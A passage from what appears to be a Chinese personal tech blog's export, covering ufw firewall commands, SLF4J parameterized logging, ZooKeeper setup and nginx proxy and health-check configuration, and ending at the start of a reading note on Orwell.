<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启用</span></span><br><span class="line">sudo ufw enable</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">系统启动时关闭所有外部对本机的访问（本机访问外部正常）。</span></span><br><span class="line">sudo ufw default deny </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭</span></span><br><span class="line">sudo ufw disable </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看防火墙状态</span></span><br><span class="line">sudo ufw status</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">允许外部访问80端口</span></span><br><span class="line">sudo ufw allow 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">禁止外部访问80端口</span></span><br><span class="line">sudo ufw delete allow 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">允许IP访问所有的本机端口</span></span><br><span class="line">sudo ufw allow from 192.168.1.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">禁止外部访问smtp服务</span></span><br><span class="line">sudo ufw deny smtp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除上面建立的某条规则</span></span><br><span class="line">sudo ufw delete deny smtp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拒绝所有的TCP流量从10.0.0.0/8 到192.168.0.1地址的22端口</span></span><br><span class="line">sudo ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 22</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">允许所有RFC1918网络（局域网/无线局域网的）访问这个主机</span></span><br><span class="line">sudo ufw allow from 10.0.0.0/8</span><br><span class="line">sudo ufw allow from 172.16.0.0/12</span><br><span class="line">sudo ufw allow from 192.168.0.0/16</span><br></pre></td></tr></table></figure>

<p><strong>惯例配置</strong></p>
<p>服务器通常只暴露用于管理的22端口及一个服务端(入)口80，内部再通过反向代理进行端口(服务)分发</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启用</span></span><br><span class="line">sudo ufw enable</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">系统启动时关闭所有外部对本机的访问（本机访问外部正常）。</span></span><br><span class="line">sudo ufw default deny </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">允许外部访问80端口及22端口</span></span><br><span class="line">sudo ufw allow 22</span><br><span class="line">sudo ufw allow 80</span><br></pre></td></tr></table></figure>

<p><strong>使用指南</strong></p>
<p><a href="http://wiki.ubuntu.org.cn/Ufw%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97">ufw中文使用指南</a></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>linux</tag>
        <tag>ubuntu</tag>
        <tag>firewall</tag>
        <tag>iptables</tag>
        <tag>ufw</tag>
        <tag>security</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>slf4j</title>
    <url>/technology/2017/01/slf4j/</url>
    <content><![CDATA[<p>slf4j是日志框架抽象的接口，slf4j-lo4j12(Facade模式设计)来统一底层接口，使用slf4j-api作为提供接口，屏蔽了日志框架实现。</p>
<h1 id="slf4j-api"><a href="#slf4j-api" class="headerlink" title="slf4j-api"></a>slf4j-api</h1><p>日志框架的抽象&#x2F;接口，使用了外观模式（Facade） 屏蔽底层日志框架的实现，提供了一套更优质的日志api</p>
<h1 id="slf4j-log4j12"><a href="#slf4j-log4j12" class="headerlink" title="slf4j-log4j12"></a>slf4j-log4j12</h1><p>使用适配器模式（Adapter）对底层日志框架(log4j等)进行转接口，对接至slf4j-api</p>
<p><strong>三者关系如下</strong></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1482806227926.png?imageMogr2/thumbnail/200" alt="img"></p>
<h1 id="使用slf4j占位符方式打印日志"><a href="#使用slf4j占位符方式打印日志" class="headerlink" title="使用slf4j占位符方式打印日志"></a>使用slf4j占位符方式打印日志</h1><h2 id="1-What-is-the-fastest-way-of-not-logging"><a href="#1-What-is-the-fastest-way-of-not-logging" class="headerlink" title="1. What is the fastest way of (not) logging?"></a>1. What is the fastest way of (not) logging?</h2><p>SLF4J supports an advanced feature called parameterized logging which can significantly boost logging performance for<em>disabled</em> logging statement.</p>
<p>For some Logger <code>logger</code>, writing,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;Entry number: &quot;</span> + i + <span class="string">&quot; is &quot;</span> + String.valueOf(entry[i]));</span><br></pre></td></tr></table></figure>

<p>incurs the cost of constructing the message parameter, that is converting both integer <code>i</code> and <code>entry[i]</code> to a String, and concatenating intermediate strings. This, regardless of whether the message will be logged or not.</p>
<p>One possible way to avoid the cost of parameter construction is by surrounding the log statement with a test. Here is an example.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(logger.isDebugEnabled()) &#123;</span><br><span class="line">  logger.debug(<span class="string">&quot;Entry number: &quot;</span> + i + <span class="string">&quot; is &quot;</span> + String.valueOf(entry[i]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This way you will not incur the cost of parameter construction if debugging is disabled for <code>logger</code>. On the other hand, if the logger is enabled for the DEBUG level, you will incur the cost of evaluating whether the logger is enabled or not, twice: once in <code>debugEnabled</code> and once in <code>debug</code>. This is an insignificant overhead because evaluating a logger takes less than 1% of the time it takes to actually log a statement.</p>
<h2 id="2-Better-yet-use-parameterized-messages"><a href="#2-Better-yet-use-parameterized-messages" class="headerlink" title="2. Better yet, use parameterized messages"></a>2. Better yet, use parameterized messages</h2><p>There exists a very convenient alternative based on message formats. Assuming <code>entry</code> is an object, you can write:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SomeObject</span>();</span><br><span class="line">logger.debug(<span class="string">&quot;The entry is &#123;&#125;.&quot;</span>, entry);</span><br></pre></td></tr></table></figure>

<p>After evaluating whether to log or not, and only if the decision is affirmative, will the logger implementation format the message and replace the ‘{}’ pair with the string value of <code>entry</code>. In other words, this form does not incur the cost of parameter construction in case the log statement is disabled.</p>
<p>The following two lines will yield the exact same output. However, the second form will outperform the first form by a factor of at least 30, in case of a <em>disabled</em> logging statement.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;The new entry is &quot;</span>+entry+<span class="string">&quot;.&quot;</span>);</span><br><span class="line">logger.debug(<span class="string">&quot;The new entry is &#123;&#125;.&quot;</span>, entry);</span><br></pre></td></tr></table></figure>

<p>A <a href="http://www.slf4j.org/apidocs/org/slf4j/Logger.html#debug(java.lang.String,%20java.lang.Object%2C%20java.lang.Object)">two argument</a> variant is also available. For example, you can write:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;The new entry is &#123;&#125;. It replaces &#123;&#125;.&quot;</span>, entry, oldEntry);</span><br></pre></td></tr></table></figure>

<p>If three or more arguments need to be passed, you can make use of the <a href="http://www.slf4j.org/apidocs/org/slf4j/Logger.html#debug(java.lang.String%2C%20java.lang.Object...)"><code>Object...</code> variant</a> of the printing methods. For example, you can write:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;Value &#123;&#125; was inserted between &#123;&#125; and &#123;&#125;.&quot;</span>, newVal, below, above);</span><br></pre></td></tr></table></figure>

<p>This form incurs the hidden cost of construction of an Object[] (object array) which is usually very small. The one and two argument variants do not incur this hidden cost and exist solely for this reason (efficiency). The slf4j-api would be smaller&#x2F;cleaner with only the Object… variant.</p>
<p>Array type arguments, including multi-dimensional arrays, are also supported.</p>
<p>SLF4J uses its own message formatting implementation which differs from that of the Java platform. This is justified by the fact that SLF4J’s implementation performs about 10 times faster but at the cost of being non-standard and less flexible.</p>
<p><strong>Escaping the “{}” pair</strong></p>
<p>The “{}” pair is called the <em>formatting anchor</em>. It serves to designate the location where arguments need to be substituted within the message pattern.</p>
<p>SLF4J only cares about the <em>formatting anchor</em>, that is the ‘{‘ character immediately followed by ‘}’. Thus, in case your message contains the ‘{‘ or the ‘}’ character, you do not have to do anything special unless the ‘}’ character immediately follows ‘}’. For example,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;Set &#123;1,2&#125; differs from &#123;&#125;&quot;</span>, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>which will print as “Set {1,2} differs from 3”.</p>
<p>You could have even written,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;Set &#123;1,2&#125; differs from &#123;&#123;&#125;&#125;&quot;</span>, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>which would have printed as “Set {1,2} differs from {3}”.</p>
<p>In the extremely rare case where the the “{}” pair occurs naturally within your text and you wish to disable the special meaning of the formatting anchor, then you need to escape the ‘{‘ character with ‘\’, that is the backslash character. Only the ‘{‘ character should be escaped. There is no need to escape the ‘}’ character. For example,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;Set \\&#123;&#125; differs from &#123;&#125;&quot;</span>, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>will print as “Set {} differs from 3”. Note that within Java code, the backslash character needs to be written as ‘\‘.</p>
<p>In the rare case where the “{}” occurs naturally in the message, you can double escape the formatting anchor so that it retains its original meaning. For example,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;File name is C:\\\\&#123;&#125;.&quot;</span>, <span class="string">&quot;file.zip&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>will print as “File name is C:\file.zip”.</p>
<h2 id="3-How-can-I-log-the-string-contents-of-a-single-possibly-complex-object"><a href="#3-How-can-I-log-the-string-contents-of-a-single-possibly-complex-object" class="headerlink" title="3. How can I log the string contents of a single (possibly complex) object ?"></a>3. How can I log the string contents of a single (possibly complex) object ?</h2><p>In relatively rare cases where the message to be logged is the string form of an object, then the parameterized printing method of the appropriate level can be used. Assuming <code>complexObject</code>is an object of certain complexity, for a log statement of level DEBUG, you can write:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.debug(<span class="string">&quot;&#123;&#125;&quot;</span>, complexObject);</span><br></pre></td></tr></table></figure>

<p>The logging system will invoke <code>complexObject.toString()</code> method only after it has ascertained that the log statement was enabled. Otherwise, the cost of <code>complexObject.toString()</code>conversion will be advantageously avoided.</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>zookeeper快速实践</title>
    <url>/technology/2017/04/zookeeper%E5%BF%AB%E9%80%9F%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="zookeeper资源获取"><a href="#zookeeper资源获取" class="headerlink" title="zookeeper资源获取"></a>zookeeper资源获取</h2><ul>
<li><a href="http://zookeeper.apache.org/">zookeeper官网</a></li>
<li><a href="http://mirrors.hust.edu.cn/apache/zookeeper/">zookeeper下载</a></li>
<li><a href="http://zookeeper.apache.org/doc/r3.4.10/zookeeperStarted.html">Getting Started</a></li>
</ul>
<h2 id="zookeeper简单使用"><a href="#zookeeper简单使用" class="headerlink" title="zookeeper简单使用"></a>zookeeper简单使用</h2><ol>
<li><p>下载zookeeper，例如：<a href="http://mirrors.hust.edu.cn/apache/zookeeper/zookeeper-3.4.10/">zookeeper-3.4.10</a></p>
</li>
<li><p>解压zookeeper-3.4.10.tar.gz，并进入解压后的目录(以下用{zookeeper}代替解压后的目录)</p>
</li>
<li><p>新建一个配置文件{zookeeper}&#x2F;<strong>conf&#x2F;zoo.cfg</strong></p>
</li>
<li><p>使用standalone mode配置</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#毫秒，心跳间隔</span></span><br><span class="line"><span class="attr">tickTime</span>=<span class="string">2000</span></span><br><span class="line"><span class="comment">#内存数据库（存储更新的事务）快照存储目录</span></span><br><span class="line"><span class="attr">dataDir</span>=<span class="string">/var/lib/zookeeper</span></span><br><span class="line"><span class="comment">#客户端的连接端口</span></span><br><span class="line"><span class="attr">clientPort</span>=<span class="string">2181</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动zookeeper</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/zkServer.sh start</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接zookeeper</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/zkCli.sh -server 127.0.0.1:2181</span><br></pre></td></tr></table></figure>

<p>进入zookeeper client，输入help可以获得client命令列表</p>
</li>
<li><p>使用create命令创建一个znode节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个znode节点来关联这个节点与数据(字符串<span class="string">&quot;my_data&quot;</span>)</span></span><br><span class="line">create /zk_test my_data</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用get命令验证创建的这个znode节点</span></span><br><span class="line">get /zk_test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用<span class="built_in">set</span>命令改变这个节点关联的数据</span></span><br><span class="line">set /zk_test junk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用delete命令删除这个节点</span></span><br><span class="line">delete /zk_test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用quit命令退出zookeeper client</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="zookeeper集群"><a href="#zookeeper集群" class="headerlink" title="zookeeper集群"></a>zookeeper集群</h2><p>生产环境中我们需要使用Replicated Mode来配置一个zookeeper集群。在一个应用中，重复的服务组叫做一个<code>quorum</code> ，在Relicated mode中，一个quorum中的所有的服务拥有同样的配置</p>
<blockquote>
<p>Note.</p>
<p>既然是集群，那服务节点起码大于2。为了满足选举Leader的需要，集群中则至少需要有三个服务节点。因为如果只有两个，在其中一个挂掉的情况下，就没有足够的服务节点去使用majority quorum机制来选举Leader</p>
</blockquote>
<p>集群配置文件</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">tickTime</span>=<span class="string">2000</span></span><br><span class="line"><span class="attr">dataDir</span>=<span class="string">/var/lib/zookeeper</span></span><br><span class="line"><span class="attr">clientPort</span>=<span class="string">2181</span></span><br><span class="line"><span class="comment"># 初始化时，在一次zookeeper quorum的服务节点初始化的过程中，连接Leader的次数</span></span><br><span class="line"><span class="attr">initLimit</span>=<span class="string">5</span></span><br><span class="line"><span class="comment"># 限制了一个节点距离Leader的间隔</span></span><br><span class="line"><span class="attr">syncLimit</span>=<span class="string">2</span></span><br><span class="line"><span class="attr">server.1</span>=<span class="string">zoo1:2888:3888</span></span><br><span class="line"><span class="attr">server.2</span>=<span class="string">zoo2:2888:3888</span></span><br><span class="line"><span class="attr">server.3</span>=<span class="string">zoo3:2888:3888</span></span><br></pre></td></tr></table></figure>

<h2 id="zookeeper编程"><a href="#zookeeper编程" class="headerlink" title="zookeeper编程"></a>zookeeper编程</h2><ul>
<li><a href="http://zookeeper.apache.org/doc/r3.4.10/zookeeperProgrammers.html">Programmer’s Guide</a></li>
<li><a href="http://zookeeper.apache.org/doc/r3.4.10/zookeeperProgrammers.html#ch_programStructureWithExample">Programming Examples in the ZooKeeper Programmer’s Guide</a></li>
</ul>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>zookeeper</tag>
        <tag>分布式</tag>
        <tag>集群</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx</title>
    <url>/technology/2017/09/nginx/</url>
    <content><![CDATA[<h1 id="一、nginx安装"><a href="#一、nginx安装" class="headerlink" title="一、nginx安装"></a>一、nginx安装</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装依赖</span></span><br><span class="line">sudo apt-get install openssl zlib1g-dev libssl-dev gcc libpcre3 libpcre3-dev</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置</span></span><br><span class="line">./configure --prefix=/srv/nginx --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gzip_static_module --with-mail --with-mail_ssl_module</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置nginx环境变量(软链接)</span></span><br><span class="line">sudo ln -s /srv/nginx/sbin/nginx /usr/local/sbin/nginx</span><br></pre></td></tr></table></figure>

<h1 id="二、nginx模块管理"><a href="#二、nginx模块管理" class="headerlink" title="二、nginx模块管理"></a>二、nginx模块管理</h1><h2 id="查看已安装的模块"><a href="#查看已安装的模块" class="headerlink" title="查看已安装的模块"></a>查看已安装的模块</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br></pre></td></tr></table></figure>

<h2 id="添加编译模块"><a href="#添加编译模块" class="headerlink" title="添加编译模块"></a>添加编译模块</h2><ol>
<li><p>查看已安装的模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制configure arguments后的模块</span></span><br><span class="line">configure arguments: --prefix=/srv/nginx --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gzip_static_module --with-mail --with-mail_ssl_module</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新配置编译选项并追加新增的某块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/srv/nginx --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gzip_static_module --with-mail --with-mail_ssl_module </span><br></pre></td></tr></table></figure>
</li>
<li><p>make</p>
<p><strong>切勿执行make install，否则将覆盖已安装的nginx</strong> </p>
</li>
<li><p>备份已安装的nginx二进制文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/local/sbin/nginx /usr/local/sbin/nginx.bak</span><br></pre></td></tr></table></figure>
</li>
<li><p>替换重新编译的er禁止文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">源码目录中</span></span><br><span class="line">cp ./objs/nginx /usr/local/sbin/nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试无误后删除备份</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm /usr/local/nginx/sbin/nginx.bak</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="三、nginx基本配置"><a href="#三、nginx基本配置" class="headerlink" title="三、nginx基本配置"></a>三、nginx基本配置</h1><h2 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h2><h3 id="http代理转发"><a href="#http代理转发" class="headerlink" title="http代理转发"></a>http代理转发</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将域名为x.domain.com的请求代理至localhost的8080端口</span></span><br><span class="line">server&#123;</span><br><span class="line">    <span class="attribute">listen</span>  <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> x.domain.com;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">       <span class="attribute">proxy_pass</span>  http://localhost:8080/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="https代理转发"><a href="#https代理转发" class="headerlink" title="https代理转发"></a>https代理转发</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认https使用443端口</span></span><br><span class="line"><span class="comment"># 将从443端口进入且域名为x.domain.com的请求代理至localhost的8080端口</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">   <span class="attribute">listen</span>       <span class="number">443</span> ssl;</span><br><span class="line">   <span class="attribute">server_name</span>  x.domain.com;</span><br><span class="line"></span><br><span class="line">   <span class="attribute">ssl</span> <span class="literal">on</span>;</span><br><span class="line">   <span class="attribute">ssl_certificate</span>      <span class="variable">$&#123;cert_path&#125;</span>/x.pem;</span><br><span class="line">   <span class="attribute">ssl_certificate_key</span>  <span class="variable">$&#123;cert_path&#125;</span>/x.key;</span><br><span class="line">   <span class="attribute">ssl_session_timeout</span>  <span class="number">5m</span>;</span><br><span class="line">   <span class="attribute">ssl_ciphers</span>  ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">   <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">   <span class="attribute">ssl_prefer_server_ciphers</span>  <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">   <span class="section">location</span> / &#123;</span><br><span class="line">       <span class="attribute">proxy_pass</span>  http://localhost:8080/;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="http强转https"><a href="#http强转https" class="headerlink" title="http强转https"></a>http强转https</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将域名为x.domain.com的请求301重定向为https协议请求</span></span><br><span class="line">server&#123;</span><br><span class="line">    <span class="attribute">listen</span>  <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> x.domain.com;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="禁止ip直接访问"><a href="#禁止ip直接访问" class="headerlink" title="禁止ip直接访问"></a>禁止ip直接访问</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#禁止ip直接访问80端口</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">   <span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line">   <span class="attribute">server_name</span> _;</span><br><span class="line">   <span class="attribute">return</span> <span class="number">444</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#禁止ip直接访问443端口</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">   <span class="attribute">listen</span>       <span class="number">443</span> ssl default_server;</span><br><span class="line">   <span class="attribute">server_name</span>  _;</span><br><span class="line"></span><br><span class="line">   <span class="attribute">ssl</span> <span class="literal">on</span>;</span><br><span class="line">   <span class="attribute">ssl_certificate</span>      <span class="variable">$&#123;pem_file&#125;</span>;</span><br><span class="line">   <span class="attribute">ssl_certificate_key</span>  <span class="variable">$&#123;key_file&#125;</span>;</span><br><span class="line">   <span class="attribute">ssl_session_timeout</span>  <span class="number">5m</span>;</span><br><span class="line">   <span class="attribute">ssl_ciphers</span>  <span class="variable">$&#123;ssl_ciphers_string&#125;</span>;</span><br><span class="line">   <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">   <span class="attribute">ssl_prefer_server_ciphers</span>  <span class="literal">on</span>;</span><br><span class="line">   <span class="attribute">return</span> <span class="number">444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、nginx开源模块"><a href="#四、nginx开源模块" class="headerlink" title="四、nginx开源模块"></a>四、nginx开源模块</h1><h2 id="上游节点健康检测"><a href="#上游节点健康检测" class="headerlink" title="上游节点健康检测"></a>上游节点健康检测</h2><p>健康检测选用淘宝团队开发的<a href="https://github.com/yaoweibin/nginx_upstream_check_module">nginx_upstream_check_module</a>模块</p>
<ol>
<li>安装nginx_upstream_check_module</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入nginx源码目录</span></span><br><span class="line">cd /srv/nginx-1.12.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载check模块</span></span><br><span class="line">wget -O nginx_upstream_check_module.zip &#x27;https://codeload.github.com/yaoweibin/nginx_upstream_check_module/zip/master&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">unzip nginx_upstream_check_module.zip</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打补丁</span></span><br><span class="line">patch -p1 &lt; ./nginx_upstream_check_module-master/check_1.12.1+.patch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加check模块(参考上面添加编译模块的方法)</span></span><br><span class="line">./configure $&#123;origin_params&#125; --add-module=./nginx_upstream_check_module-master/</span><br><span class="line">make (注意：此处只make，编译参数需要和之前的一样)</span><br><span class="line">mv /usr/local/sbin/nginx /usr/local/sbin/nginx-1.21.1.bak</span><br><span class="line">cp ./objs/nginx /usr/local/sbin/nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检测是否成功</span></span><br><span class="line">/usr/local/sbin/nginx -t</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>配置健康检测</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置上游服务器健康检测</span></span><br><span class="line">upstream tomcat-cluster-2 &#123;</span><br><span class="line">    server 127.0.0.1:8082; #上游服务器地址及端口</span><br><span class="line">    check interval=1800000 rise=2 fall=5 timeout=1000 type=http; #检测规则</span><br><span class="line">    check_http_send &quot;GET /health HTTP/1.0\r\n\r\n&quot;; #健康检测接口，将按检测规则进行轮询</span><br><span class="line">    check_http_expect_alive http_2xx http_3xx; #规定健康检测接口的成功返回状态码</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置服务器</span></span><br><span class="line">server&#123;</span><br><span class="line">    listen  80;</span><br><span class="line">    server_name x.domain.cn;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass  http://tomcat-cluster-2/;</span><br><span class="line">    &#125;</span><br><span class="line">    # 开启健康状态页面路由</span><br><span class="line">    location /status &#123;</span><br><span class="line">            check_status html; #健康状态页面，默认以html格式展现，可选html、json、csv</span><br><span class="line">            access_log   off; #不记录access_log</span><br><span class="line">            #allow all;</span><br><span class="line">            #deny all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看健康状态</li>
</ol>
<p>按照如上配置，访问x.domain.cn&#x2F;status可以看到健康状态<img src="http://img.willowspace.cn/willowspace_2016/1505020882341.png"></p>
<p>其中<code>number</code>代表上游服务器节点个数，<code>generation</code>为健康检测本身load的次数(nginx重启或者reload都会导致<code>generation</code>增加)</p>
<p>更多健康检测模块配置参考<a href="http://tengine.taobao.org/document_cn/http_upstream_check_cn.html">配置文档</a></p>
<h2 id="sticky"><a href="#sticky" class="headerlink" title="sticky"></a>sticky</h2><p>官方收费版，参考<a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html#sticky">nginx stciky</a>模块</p>
<p>开源版，参考<a href="https://bitbucket.org/nginx-goodies/nginx-sticky-module-ng">https://bitbucket.org/nginx-goodies/nginx-sticky-module-ng</a></p>
<h1 id="五、更多配置"><a href="#五、更多配置" class="headerlink" title="五、更多配置"></a>五、更多配置</h1><h2 id="413-Request-Entity-Too-Large-Error"><a href="#413-Request-Entity-Too-Large-Error" class="headerlink" title="413 Request Entity Too Large Error"></a>413 Request Entity Too Large Error</h2><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># http, server 或 location节点中添加</span></span><br><span class="line"><span class="attribute">client_max_body_size</span> <span class="number">10M</span>;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>nginx</tag>
        <tag>负载均衡</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>“奥威尔式”童年</title>
    <url>/reading/2019/02/%E2%80%9C%E5%A5%A5%E5%A8%81%E5%B0%94%E5%BC%8F%E2%80%9D%E7%AB%A5%E5%B9%B4/</url>
    <content><![CDATA[<p>连日阴雨的杭州今天终于放晴一天，本来晒着太阳准备开始读一读乔治·奥威尔的《一九八四》，看到译者序部分推荐应该把同是出自奥威尔之手的《如此欢乐的童年》和《一九八四》放在一起来读，于是抱着能更加全面了解后者的目的先看了一遍前者，当然也有一部分原因是前者书名成功引起了我的兴趣。但《如此欢乐的童年》书名其实是反讽，内容描述了奥威尔在一九一五年左右在预备学校圣塞浦里安学校饱受凌辱的残酷童年，对于他自身的心理感受的描写跳跃闪回于他的成年和少年时期，从不同时空的不同视角描述一个童年不幸孩子的生活和心路历程（当然他没有抛开当时一系列的社会、阶级、宗教、金钱崇拜等因素）。最后他对童年的思考和尝鼎一脔的社会洞见我深有感触，下面是摘选的一部分。</p>
<blockquote>
